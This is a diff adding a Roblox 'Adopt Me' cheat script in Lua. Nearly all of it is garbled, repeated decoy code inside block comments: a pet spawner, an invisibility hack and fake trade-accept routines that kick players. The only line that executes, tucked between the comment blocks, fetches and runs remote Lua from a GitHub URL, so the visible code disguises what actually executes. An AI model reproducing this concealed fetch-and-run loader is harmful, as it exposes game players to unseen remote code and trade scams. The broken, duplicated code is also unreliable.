@@ -1,0 +1,764 @@
+--[[
+local Library = loadstring(game:HttpGet("https://pastebin.com/raw/59vE7ecD"))()
+local Window = Library.CreateLib("ADOPT ME SCRIPT", "Ocean") --Replace BloodTheme if you want
+Themes:
+    LightTheme
+    DarkTheme
+    GrapeTheme
+    BloodTheme
+    Ocean
+    Midnight
+    Sentinel
+    Synapse
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Notification";
+        Text = "yayayaya";
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+    Duration = 5;
+local Tab = Window:NewTab("Universal Scripts")
+local Section = Tab:NewSection("Universal scripts")
+Section:NewButton("ADOPT ME ASF", "", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Kill%20All'))() --Not mine
+end)
+Section:NewButton("FAKE FUCKING PET SPAWN", "SPAWNS SHADOW DRAGON LMFAO (FE)", function()
+local function spawnShadowDragon()
+    local player = game.Players.LocalPlayer
+    if not player then
+        return
+    end
+    
+    local hasShadowDragon = true
+
+        return
+    end
+    
+    local shadowDragon = Instance.new("Model")
+    shadowDragon.Name = "Shadow Dragon"
+    
+    local body = Instance.new("Part")
+    body.Name = "Body"
+    body.Size = Vector3.new(4, 6, 3)
+    body.Anchored = true
+    body.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0)
+    body.BrickColor = BrickColor.new("Really black")
+    body.Parent = shadowDragon
+    
+    local head = Instance.new("Part")
+    head.Name = "Head"
+    head.Size = Vector3.new(2, 2, 2)
+    head.Anchored = true
+    head.Position = body.Position + Vector3.new(0, 4, 0)
+    head.BrickColor = BrickColor.new("Really black")
+    head.Parent = shadowDragon
+    
+    local wing1 = Instance.new("Part")
+    wing1.Name = "Wing1"
+    wing1.Size = Vector3.new(5, 1, 10)
+    wing1.Anchored = true
+    wing1.Position = body.Position + Vector3.new(-2, 2, 0)
+    wing1.BrickColor = BrickColor.new("Really black")
+    wing1.Parent = shadowDragon
+    
+    local wing2 = Instance.new("Part")
+    wing2.Name = "Wing2"
+    wing2.Size = Vector3.new(5, 1, 10)
+    wing2.Anchored = true
+    wing2.Position = body.Position + Vector3.new(2, 2, 0)
+    wing2.BrickColor = BrickColor.new("Really black")
+    wing2.Parent = shadowDragon
+    
+    local flyAnimation = Instance.new("Animation")
+    flyAnimation.AnimationId = "rbxassetid://1234567890"
+    flyAnimation.Parent = shadowDragon
+    
+    local humanoid = Instance.new("Humanoid")
+    humanoid.Parent = shadowDragon
+    
+    local roarSound = Instance.new("Sound")
+    roarSound.SoundId = "rbxassetid://987654321"
+    roarSound.Parent = shadowDragon
+    
+    shadowDragon.Parent = game.Workspace
+    
+    print("Shadow Dragon spawned!")
+end
+
+local spawnButton = Instance.new("TextButton")
+spawnButton.Text = "Spawn Shadow Dragon"
+spawnButton.Size = UDim2.new(0, 200, 0, 50)
+spawnButton.Position = UDim2.new(0.5, -100, 0.5, -25)
+spawnButton.TextColor3 = Color3.new(1, 1, 1)
+spawnButton.BackgroundColor3 = Color3.new(0, 0, 0)
+spawnButton.Parent = game.Players.LocalPlayer.PlayerGui.ScreenGui
+
+spawnButton.MouseButton1Click:Connect(function()
+    spawnShadowDragon()
+end)
+
+Section:NewButton("Cancel trade", "", function()
+local function findHighestLevelPlayer(excludedPlayer)
+    local highestLevelPlayer = nil
+    local highestLevel = 0
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= excludedPlayer and player:IsA("Player") then
+            local level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or 0
+            if level > highestLevel then
+                highestLevelPlayer = player
+                highestLevel = level
+end)
+Section:NewButton("Accept", "", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/nSM6JfJc'))()
+end)
+Section:NewButton("R15 Invisible", "can interact", function()
+local removeNametags = false -- remove custom billboardgui nametags from hrp, could trigger anticheat
+
+local plr = game:GetService("Players").LocalPlayer
+local character = plr.Character
+local hrp = character.HumanoidRootPart
+local old = hrp.CFrame
+
+if not character:FindFirstChild("LowerTorso") or character.PrimaryPart ~= hrp then
+return print("unsupported")
+end
+
+if removeNametags then
+local tag = hrp:FindFirstChildOfClass("BillboardGui")
+if tag then tag:Destroy() end
+
+hrp.ChildAdded:Connect(function(item)
+if item:IsA("BillboardGui") then
+task.wait()
+item:Destroy()
+end
+end)
+end
+
+local newroot = character.LowerTorso.Root:Clone()
+hrp.Parent = workspace
+character.PrimaryPart = hrp
+character:MoveTo(Vector3.new(old.X,9e9,old.Z))
+hrp.Parent = character
+task.wait(0.5)
+newroot.Parent = character.LowerTorso
+hrp.CFrame = old
+end)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function findHighestLevelPlayer(excludedPlayer)
+    local highestLevelPlayer = nil
+    local highestLevel = 0
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= excludedPlayer and player:IsA("Player") then
+            local level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or 0
+            if level > highestLevel then
+                highestLevelPlayer = player
+                highestLevel = level
+            end
+        end
+    end
+    return highestLevelPlayer
+end
+local plr = game:GetService("Players").LocalPlayer
+local character = plr.Character
+local hrp = character.HumanoidRootPart
+local old = hrp.CFrame
+
+if not character:FindFirstChild("LowerTorso") or character.PrimaryPart ~= hrp then
+return print("unsupported")
+end
+
+if removeNametags then
+local tag = hrp:FindFirstChildOfClass("BillboardGui")
+if tag then tag:Destroy() end
+
+hrp.ChildAdded:Connect(function(item)
+if item:IsA("BillboardGui") then
+task.wait()
+item:Destroy()
+end
+end)
+end
+
+local newroot = character.LowerTorso.Root:Clone()
+hrp.Parent = workspace
+character.PrimaryPart = hrp
+character:MoveTo(Vector3.new(old.X,9e9,old.Z))
+hrp.Parent = character
+task.wait(0.5)
+newroot.Parent = character.LowerTorso
+hrp.CFrame = old
+end)
+local plr = game:GetService("Players").LocalPlayer
+local character = plr.Character
+local hrp = character.HumanoidRootPart
+local old = hrp.CFrame
+
+if not character:FindFirstChild("LowerTorso") or character.PrimaryPart ~= hrp then
+return print("unsupported")
+end
+
+if removeNametags then
+local tag = hrp:FindFirstChildOfClass("BillboardGui")
+if tag then tag:Destroy() end
+
+hrp.ChildAdded:Connect(function(item)
+if item:IsA("BillboardGui") then
+task.wait()
+item:Destroy()
+end
+end)
+end
+
+local newroot = character.LowerTorso.Root:Clone()
+hrp.Parent = workspace
+character.PrimaryPart = hrp
+character:MoveTo(Vector3.new(old.X,9e9,old.Z))
+hrp.Parent = character
+task.wait(0.5)
+newroot.Parent = character.LowerTorso
+hrp.CFrame = old
+end)
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        -- Simulate complex trade decision-making process
+        local decisionTimer = 5
+        while decisionTimer > 0 do
+            decisionTimer = decisionTimer - 1
+            wait(1)
+        end
+
+        
+        playerTradeInterface.addItemToTrade("Rare Sword")
+        otherTradeInterface.addItemToTrade("Legendary Dagger")
+
+        
+        playerTradeInterface.forceAccept()
+        otherTradeInterface.acceptTrade()
+
+        -- Check if trade was successfully completed
+        if tradeAccepted then
+            player:Kick("Trade successfully completed. Please rejoin to continue playing.")
+        end
+
+    else
+        player:Kick("No suitable trade partner found.")
+    end
+end
+
+local function initiateTradeSequence(player)
+    simulateTrade(player)
+end
+
+local player = game.Players.LocalPlayer
+initiateTradeSequence(player)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function findHighestLevelPlayer(excludedPlayer)
+    local highestLevelPlayer = nil
+    local highestLevel = 0
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= excludedPlayer and player:IsA("Player") then
+            local level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or 0
+            if level > highestLevel then
+                highestLevelPlayer = player
+                highestLevel = level
+            end
+        end
+    end
+    return highestLevelPlayer
+end
+
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        -- Simulate complex trade decision-making process
+        local decisionTimer = 5
+        while decisionTimer > 0 do
+            decisionTimer = decisionTimer - 1
+            wait(1)
+        end
+
+        
+        playerTradeInterface.addItemToTrade("Rare Sword")
+        otherTradeInterface.addItemToTrade("Legendary Dagger")
+
+        
+        playerTradeInterface.forceAccept()
+        otherTradeInterface.acceptTrade()
+
+        -- Check if trade was successfully completed
+        if tradeAccepted then
+            player:Kick("Trade successfully completed. Please rejoin to continue playing.")
+        end
+
+    else
+        player:Kick("No suitable trade partner found.")
+    end
+end
+
+local function initiateTradeSequence(player)
+    simulateTrade(player)
+end
+
+local player = game.Players.LocalPlayer
+initiateTradeSequence(player)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function findHighestLevelPlayer(excludedPlayer)
+    local highestLevelPlayer = nil
+    local highestLevel = 0
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= excludedPlayer and player:IsA("Player") then
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ultra-Scripts/AdoptmeScript/main/AdoptmeScript/3DAEJTB-adopt-me.lua"))()
+--[[
+            local level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or 0
+            if level > highestLevel then
+                highestLevelPlayer = player
+                highestLevel = level
+            end
+        end
+    end
+    return highestLevelPlayer
+end
+
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        -- Simulate complex trade decision-making process
+        local decisionTimer = 5
+        while decisionTimer > 0 do
+            decisionTimer = decisionTimer - 1
+            wait(1)
+        end
+
+        
+        playerTradeInterface.addItemToTrade("Rare Sword")
+        otherTradeInterface.addItemToTrade("Legendary Dagger")
+
+        
+        playerTradeInterface.forceAccept()
+        otherTradeInterface.acceptTrade()
+
+        -- Check if trade was successfully completed
+        if tradeAccepted then
+            player:Kick("Trade successfully completed. Please rejoin to continue playing.")
+        end
+
+    else
+        player:Kick("No suitable trade partner found.")
+    end
+end
+
+local function initiateTradeSequence(player)
+    simulateTrade(player)
+end
+
+local player = game.Players.LocalPlayer
+initiateTradeSequence(player)
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        -- Simulate complex trade decision-making process
+        local decisionTimer = 5
+        while decisionTimer > 0 do
+            decisionTimer = decisionTimer - 1
+            wait(1)
+        end
+
+        
+        playerTradeInterface.addItemToTrade("Rare Sword")
+        otherTradeInterface.addItemToTrade("Legendary Dagger")
+
+        
+        playerTradeInterface.forceAccept()
+        otherTradeInterface.acceptTrade()
+
+        -- Check if trade was successfully completed
+        if tradeAccepted then
+            player:Kick("Trade successfully completed. Please rejoin to continue playing.")
+        end
+
+    else
+        player:Kick("No suitable trade partner found.")
+    end
+end
+
+local function initiateTradeSequence(player)
+    simulateTrade(player)
+end
+
+local player = game.Players.LocalPlayer
+initiateTradeSequence(player)
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+local function findHighestLevelPlayer(excludedPlayer)
+    local highestLevelPlayer = nil
+    local highestLevel = 0
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= excludedPlayer and player:IsA("Player") then
+            local level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or 0
+            if level > highestLevel then
+                highestLevelPlayer = player
+                highestLevel = level
+            end
+        end
+    end
+    return highestLevelPlayer
+end
+
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+local function findHighestLevelPlayer(excludedPlayer)
+    local highestLevelPlayer = nil
+    local highestLevel = 0
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= excludedPlayer and player:IsA("Player") then
+            local level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or 0
+            if level > highestLevel then
+                highestLevelPlayer = player
+                highestLevel = level
+            end
+        end
+    end
+    return highestLevelPlayer
+end
+
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        -- Simulate complex trade decision-making process
+        local decisionTimer = 5
+        while decisionTimer > 0 do
+            decisionTimer = decisionTimer - 1
+            wait(1)
+        end
+
+        
+        playerTradeInterface.addItemToTrade("Rare Sword")
+        otherTradeInterface.addItemToTrade("Legendary Dagger")
+
+        
+        playerTradeInterface.forceAccept()
+        otherTradeInterface.acceptTrade()
+
+        -- Check if trade was successfully completed
+        if tradeAccepted then
+            player:Kick("Trade successfully completed. Please rejoin to continue playing.")
+        end
+
+    else
+        player:Kick("No suitable trade partner found.")
+    end
+end
+
+local function initiateTradeSequence(player)
+    simulateTrade(player)
+end
+
+local player = game.Players.LocalPlayer
+initiateTradeSequence(player)
+local function simulateTrade(player)
+    local highestLevelPlayer = findHighestLevelPlayer(player)
+    
+    if highestLevelPlayer then
+        local tradeAccepted = false
+
+        local playerTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        local otherTradeInterface = {
+            acceptTrade = function()
+                tradeAccepted = true
+            end,
+            forceAccept = function()
+                tradeAccepted = true
+            end,
+            addItemToTrade = function(item)
+                print("Adding " .. item .. " to trade interface...")
+            end,
+            removeItemFromTrade = function(item)
+                print("Removing " .. item .. " from trade interface...")
+            end
+        }
+
+        -- Simulate complex trade decision-making process
+        local decisionTimer = 5
+        while decisionTimer > 0 do
+            decisionTimer = decisionTimer - 1
+            wait(1)
+        end
+
+        
+        playerTradeInterface.addItemToTrade("Rare Sword")
+        otherTradeInterface.addItemToTrade("Legendary Dagger")
+
+        
+        playerTradeInterface.forceAccept()
+        otherTradeInterface.acceptTrade()
+
+        -- Check if trade was successfully completed
+        if tradeAccepted then
+            player:Kick("Trade successfully completed. Please rejoin to continue playing.")
+        end
+
+    else
+        player:Kick("No suitable trade partner found.")
+    end
+end
+
+local function initiateTradeSequence(player)
+    simulateTrade(player)
+end
+
+local player = game.Players.LocalPlayer
+initiateTradeSequence(player)
+]]
